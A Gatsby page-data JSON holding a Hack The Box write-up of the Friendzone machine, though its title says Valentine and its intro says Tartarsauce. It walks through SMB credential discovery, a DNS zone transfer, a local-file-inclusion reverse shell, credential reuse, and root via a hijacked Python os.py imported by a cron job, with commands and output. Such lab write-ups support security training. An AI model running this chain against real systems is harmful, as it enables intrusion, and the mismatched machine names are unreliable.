{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240809/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Machine Info</h2>\n<p>Tartarsauce is a medium-rated, retired machine from Hack the Box. It’s a wonderful machine which enables us to learn how to enumerate everthing.</p>\n<p>Since OSCP’s unofficial motto is “enumerate harder”, it’s definitely worth to look into this machine.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 693px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/9cbf9801f65c7ec44eae832c78f05a46/ee2da/valentine.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 92.1875%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADHElEQVR42n2Sy28TVxTGvWNDSOwk9owfY8/DM+OZsedlT4hd27EdVSGuUIhEFggh8V5AV1VFq4qqUlWQEO2mGzbdtd0hsYI1IP4Udmwrdff1u2MbkdRk8dO5c+e73zn33JPZqLj4iDKnOofrTcZCtZki1sf0S8hslLlYUCIyyXuEUXKxLnlYyetYKejIyd5xg/IyQ5FVI3XScrC+1cD6yMbG1MbqwIKz5+HBo1v49ucbsEcuVpUGNln5epXaGrXVBm/izBN4yOQOTWSvGcjeNLB2V0f2noHclTrWLtooXq7hj5e/45+HT/H+x9/w7PmvyF+XsXJBRa5NnW0hpxPNnKFayKzd0ZC9QqMDCsbcTCxWaWMlMRFcdfD2xRt8ePwA728f4fWfr2B/o+LMrSLOfifh7H1yu4hzBwpWhypW+yoyshIipUZ0YgUoOiGkRgh1GODvX+4Cr97h3yd/4dn3N6BtRZDLEYp2gELcRH7bQ6HdhOS3ILk+MkWDPxfoRIv5ogE2S01kCy0E/QZ++uEaHn59BLdnY03mays0UAKUqm2UKqQao1SbkUlNPkFSA1j+AN3xRSTDfTQ7e2h1d9HcHiM8v4+t4RTJYAor6EPSeJv6JwWRJYY+nGiA8YUjdEcH6E2mmOwfYrR3Cb3dKbqTrzDcO4Qd9lPtyfPHDMv1NhQrQcnooOK4MNoOKmaHvWUl+rzH2gyhrZjJ5w2FqNY4D7c9YYVfwt3uIJyE2N45gMO9RjRmVSNG/o9JexdWuMPk8ecrFKZ5Nnuz4qOgRFxHHNYWv4MU8Vjimvmqz/0g1Z56ZUmNoPns4RcuKhwLmd9mx4eZNNHoejAin3sxYwve0EFdjIsanVZhBNVLUA8SKDZ7p4aMIYygA91nz6xZ/1Svg3rUYWynZ5YbUij6YYeiVxPo3oDZhUHMEeG3O0gTyBwr09+hZpeaPs+cUuFibASyNuuPOCBmU1SWJp3PaqHmp/HUHqYGeoyyGaPmBTDCFtSWz6uxt26Pryuq6qUjU6SueOKFlxouqqrYon9B+jiKHaXzWbW35nP6f6OF4X9xBCMdupRMmgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9cbf9801f65c7ec44eae832c78f05a46/a59e9/valentine.webp 192w,\n/static/9cbf9801f65c7ec44eae832c78f05a46/0ca9f/valentine.webp 384w,\n/static/9cbf9801f65c7ec44eae832c78f05a46/a5a71/valentine.webp 693w\"\n              sizes=\"(max-width: 693px) 100vw, 693px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9cbf9801f65c7ec44eae832c78f05a46/3b721/valentine.png 192w,\n/static/9cbf9801f65c7ec44eae832c78f05a46/66595/valentine.png 384w,\n/static/9cbf9801f65c7ec44eae832c78f05a46/ee2da/valentine.png 693w\"\n            sizes=\"(max-width: 693px) 100vw, 693px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9cbf9801f65c7ec44eae832c78f05a46/ee2da/valentine.png\"\n            alt=\"Friendzone\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<blockquote>\n<p>As always, let’s dive into the machine!</p>\n</blockquote>\n<h2>2. Enumeration</h2>\n<p>We start with nmap scan.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]\r\n└─$ sudo nmap 10.10.10.123 -Pn -sC -sV\r\n[sudo] password for hosan: \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 13:37 EDT\r\nNmap scan report for 10.10.10.123\r\nHost is up (0.062s latency).\r\nNot shown: 993 closed tcp ports (reset)\r\nPORT    STATE SERVICE     VERSION\r\n21/tcp  open  ftp         vsftpd 3.0.3\r\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)\r\n|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)\r\n|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)\r\n53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)\r\n| dns-nsid: \r\n|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu\r\n80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))\r\n|_http-server-header: Apache/2.4.29 (Ubuntu)\r\n|_http-title: Friend Zone Escape software\r\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r\n443/tcp open  ssl/http    Apache httpd 2.4.29\r\n|_http-title: 404 Not Found\r\n|_ssl-date: TLS randomness does not represent time\r\n| tls-alpn: \r\n|_  http/1.1\r\n|_http-server-header: Apache/2.4.29 (Ubuntu)\r\n| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO\r\n| Not valid before: 2018-10-05T21:02:30\r\n|_Not valid after:  2018-11-04T21:02:30\r\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\r\nService Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nHost script results:\r\n....and so on</code></pre></div>\n<p>There are several services running on our host:</p>\n<ul>\n<li>ftp</li>\n<li>samba</li>\n<li>http</li>\n<li>https</li>\n<li>dns</li>\n</ul>\n<p>FTP wasn’t interesting at all. So I’ll skip this one and start with samba</p>\n<h3>2.1 Samba</h3>\n<p>With quick search with crackmapexec, I could easily find that we have read access on “general” and r/w access on “Development” share. And in general share:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]\r\n└─$ smbclient //10.10.10.123/general    \r\nPassword for [WORKGROUP\\hosan]:\r\nTry \"help\" to get a list of possible commands.\r\nsmb: \\> ls\r\n  .                                   D        0  Wed Jan 16 15:10:51 2019\r\n  ..                                  D        0  Tue Sep 13 10:56:24 2022\r\n  creds.txt                           N       57  Tue Oct  9 19:52:42 2018</code></pre></div>\n<p>We could find creds.txt with admin:WORKWORKHhallelujah@#. Good start indeed, but we still don’t know where to use this credential. Thus, Let’s move on to DNS</p>\n<h3>2.2 DNS Zone Transfer</h3>\n<p>I just quickly tried zone transfer on our host friendzone.red (revealed from nmap scan)</p>\n<p>It is always better to enumerate subdomain (not vhost, vhost can be enumerated with e.g. FFUF) with DNS if DNS server is on presence.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]\r\n└─$ dig axfr friendzone.red @10.10.10.123 \r\n; &lt;&lt;>> DiG 9.19.21-1-Debian &lt;&lt;>> axfr friendzone.red @10.10.10.123\r\n;; global options: +cmd\r\nfriendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\r\nfriendzone.red.         604800  IN      AAAA    ::1\r\nfriendzone.red.         604800  IN      NS      localhost.\r\nfriendzone.red.         604800  IN      A       127.0.0.1\r\nadministrator1.friendzone.red. 604800 IN A      127.0.0.1\r\nhr.friendzone.red.      604800  IN      A       127.0.0.1\r\nuploads.friendzone.red. 604800  IN      A       127.0.0.1\r\nfriendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\r\n;; Query time: 124 msec\r\n;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)\r\n;; WHEN: Fri Aug 16 14:23:27 EDT 2024\r\n;; XFR size: 8 records (messages 1, bytes 289)</code></pre></div>\n<p>So we found 3 subdomains, hr.friendzone, uploads.friendzone and administrator1.friendzone.</p>\n<p>Now it’s time to move on to webapp.</p>\n<h3>2.3 HTTP friendzone.red</h3>\n<p>(second photo)</p>\n<p>I tried to enumerate subdirectories with ffuf, but couldn’t find single entry and found subdomains via DNS weren’t there. So maybe we should try https.</p>\n<h3>2.4 HTTPS friendzone.red</h3>\n<p><a href=\"https://friendzone.red\" target=\"_blank\" rel=\"nofollow\">https://friendzone.red</a> showed me slightly different index page, but also nothing interesting was found during subdirectory enumeration. So I added administrator1 to my /etc/hosts and proceed.</p>\n<p>(Login Form)</p>\n<p>So here is a Login form and I immediately tried my credential which I found earlier.</p>\n<p>Website showed me a quick message:</p>\n<blockquote>\n<p>Login Done! visit /dashboard.php</p>\n</blockquote>\n<p>So I did:</p>\n<p>(dashboard.php)</p>\n<p>It is pretty obious that we have some kind of LFI or Injection, since we have 2 parameters. After struggling a while, I could find out that pagename may potentially cause a problem:</p>\n<p>(abused)</p>\n<p>Since we know that this /dashboard entry is generated by dashboard.php, this output indicates that ./php_filename_without_extension would call php_filename_without_extension.php</p>\n<p>So, if we can somehow upload a revshell.php and access it via LFI vector, we could obtain a revshell.</p>\n<h2>3. Initial Foothold</h2>\n<p>I remebered that we had a write permission on /Development in SMB part. After googling, I found out how to reveal an absolute path of a SMB share with nmap script.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]\r\n└─$ sudo nmap 10.10.10.123 -p445 -Pn -sC --script smb-enum-shares.nse\r\n[sudo] password for hosan: \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 16:06 EDT\r\nNmap scan report for friendzone.red (10.10.10.123)\r\nHost is up (0.047s latency).\r\n\r\nPORT    STATE SERVICE\r\n445/tcp open  microsoft-ds\r\n\r\nHost script results:\r\n| smb-enum-shares: \r\n|   account_used: guest\r\n|   \\\\10.10.10.123\\Development: \r\n|     Type: STYPE_DISKTREE\r\n|     Comment: FriendZone Samba Server Files\r\n|     Users: 0\r\n|     Max Users: &lt;unlimited>\r\n|     Path: C:\\etc\\Development\r\n|     Anonymous access: READ/WRITE\r\n|     Current user access: READ/WRITE\r\n....and so on</code></pre></div>\n<p>So we got an absolute path, a LFI vector AND a write permission. If we visit /etc/Development/test (there is test.php which only executes echo “Please subscribe”)</p>\n<p>(echo)</p>\n<p>We can indeed see that test.php is being executed.</p>\n<p>Now, everything combined:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ nc -lvnp 443\r\nlistening on [any] 443 ...\r\nconnect to [10.10.16.14] from (UNKNOWN) [10.10.10.123] 57610\r\nLinux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\r\n 23:21:26 up  1:43,  0 users,  load average: 0.00, 0.00, 0.75\r\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\r\n/bin/sh: 0: can't access tty; job control turned off\r\n$ whoami\r\nwww-data</code></pre></div>\n<p>I got a revshell. So there was only three steps:</p>\n<ol>\n<li>Modified rev.php and upload it</li>\n<li>Opened port to listen incoming connection</li>\n<li>Visited our rev.php with LFI vector : pagename=/etc/Development/rev</li>\n</ol>\n<h2>4. Privilege Escalation</h2>\n<p>Even if www-data already gives us the user flag, I found a credential of the user friend:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ cd /var/www\r\n$ ls\r\nadmin\r\nfriendzone\r\nfriendzoneportal\r\nfriendzoneportaladmin\r\nhtml\r\nmysql_data.conf\r\nuploads\r\n$ cat mysql_data.conf     \r\nfor development process this is the mysql creds for user friend\r\n\r\ndb_user=friend\r\n\r\ndb_pass=Agpyu12!0.213$\r\n\r\ndb_name=FZ</code></pre></div>\n<p>And I could sue it for ssh connection.</p>\n<h3>4.1 Using Pspy</h3>\n<p>After executing pspy on our victim host,</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">2024/08/16 23:40:01 CMD: UID=0    PID=3203   | /usr/bin/python /opt/server_admin/reporter.py \r\n2024/08/16 23:40:01 CMD: UID=0    PID=3202   | /bin/sh -c /opt/server_admin/reporter.py \r\n2024/08/16 23:40:01 CMD: UID=0    PID=3201   | /usr/sbin/CRON -f </code></pre></div>\n<p>I found this suspicious reporter.py</p>\n<p>reporter.py imports os, but does not use it. So I couldn’t modify the script to execute some commands. (I also didn’t have write privielge) After searching for a while, I noticed there is a potential risk if a non-privileged user can modify the library itself.</p>\n<blockquote>\n<p>So I looked after /usr/lib/python2.7/os.py:</p>\n</blockquote>\n<p>The mechanism is pretty simple:</p>\n<ol>\n<li>Loading python module is actually compiling it.</li>\n<li>So if we modify os.py, modified part of code will be executed every time os is being imported.</li>\n<li>We can simply add some scripts at the end of the os.py!</li>\n</ol>\n<p>So I modified the end of the file like this:</p>\n<p>(photo)</p>\n<p>And waited calmly… (I thought importing os in os.py would not work and tried to do it again, but it worked anyway)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ nc -lvnp 8080\r\nlistening on [any] 8080 ...\r\nconnect to [10.10.16.14] from (UNKNOWN) [10.10.10.123] 38182\r\n# whoami\r\nwhoami\r\nroot\r\n# cat /root/root.txt\r\ncat /root/root.txt\r\n667053ead4657d95ce354e508e17ec07</code></pre></div>\n<p>And that’s pretty much it!</p>\n<h2>5. Review</h2>\n<p>While I didn’t mention it earlier, there were numerous rabbit holes, such as the /upload endpoint, which initially seemed like a promising vector for the initial foothold.</p>\n<p>However, this led to some challenges and required a bit of perseverance to find the correct path.</p>\n<p>Overall, this machine serves as valuable preparation for OSCP, given the extensive enumeration required.</p>\n<p>It could be improved by more clearly distinguishing between legitimate paths and false positives.</p>\n<h2>Source</h2>\n<ul>\n<li>Hack The Box 2024</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"Hack The Box Valentine","summary":"Solving \"Valentine\" machine from HTB","date":"2024.08.09.","before":"2023.03.10.","after":"2024.08.12.","categories":["C-SEC","hackthebox","pentest","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADHElEQVR42n2Sy28TVxTGvWNDSOwk9owfY8/DM+OZsedlT4hd27EdVSGuUIhEFggh8V5AV1VFq4qqUlWQEO2mGzbdtd0hsYI1IP4Udmwrdff1u2MbkdRk8dO5c+e73zn33JPZqLj4iDKnOofrTcZCtZki1sf0S8hslLlYUCIyyXuEUXKxLnlYyetYKejIyd5xg/IyQ5FVI3XScrC+1cD6yMbG1MbqwIKz5+HBo1v49ucbsEcuVpUGNln5epXaGrXVBm/izBN4yOQOTWSvGcjeNLB2V0f2noHclTrWLtooXq7hj5e/45+HT/H+x9/w7PmvyF+XsXJBRa5NnW0hpxPNnKFayKzd0ZC9QqMDCsbcTCxWaWMlMRFcdfD2xRt8ePwA728f4fWfr2B/o+LMrSLOfifh7H1yu4hzBwpWhypW+yoyshIipUZ0YgUoOiGkRgh1GODvX+4Cr97h3yd/4dn3N6BtRZDLEYp2gELcRH7bQ6HdhOS3ILk+MkWDPxfoRIv5ogE2S01kCy0E/QZ++uEaHn59BLdnY03mays0UAKUqm2UKqQao1SbkUlNPkFSA1j+AN3xRSTDfTQ7e2h1d9HcHiM8v4+t4RTJYAor6EPSeJv6JwWRJYY+nGiA8YUjdEcH6E2mmOwfYrR3Cb3dKbqTrzDcO4Qd9lPtyfPHDMv1NhQrQcnooOK4MNoOKmaHvWUl+rzH2gyhrZjJ5w2FqNY4D7c9YYVfwt3uIJyE2N45gMO9RjRmVSNG/o9JexdWuMPk8ecrFKZ5Nnuz4qOgRFxHHNYWv4MU8Vjimvmqz/0g1Z56ZUmNoPns4RcuKhwLmd9mx4eZNNHoejAin3sxYwve0EFdjIsanVZhBNVLUA8SKDZ7p4aMIYygA91nz6xZ/1Svg3rUYWynZ5YbUij6YYeiVxPo3oDZhUHMEeG3O0gTyBwr09+hZpeaPs+cUuFibASyNuuPOCBmU1SWJp3PaqHmp/HUHqYGeoyyGaPmBTDCFtSWz6uxt26Pryuq6qUjU6SueOKFlxouqqrYon9B+jiKHaXzWbW35nP6f6OF4X9xBCMdupRMmgAAAABJRU5ErkJggg=="},"images":{"fallback":{"src":"/static/9cbf9801f65c7ec44eae832c78f05a46/6859d/valentine.png","srcSet":"/static/9cbf9801f65c7ec44eae832c78f05a46/f8834/valentine.png 173w,\n/static/9cbf9801f65c7ec44eae832c78f05a46/a6174/valentine.png 347w,\n/static/9cbf9801f65c7ec44eae832c78f05a46/6859d/valentine.png 693w","sizes":"(min-width: 693px) 693px, 100vw"},"sources":[{"srcSet":"/static/9cbf9801f65c7ec44eae832c78f05a46/82fcb/valentine.webp 173w,\n/static/9cbf9801f65c7ec44eae832c78f05a46/4f422/valentine.webp 347w,\n/static/9cbf9801f65c7ec44eae832c78f05a46/ab6c7/valentine.webp 693w","type":"image/webp","sizes":"(min-width: 693px) 693px, 100vw"}]},"width":693,"height":640}},"publicURL":"/static/9cbf9801f65c7ec44eae832c78f05a46/valentine.png"}}}}]}},"pageContext":{"slug":"/240809/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}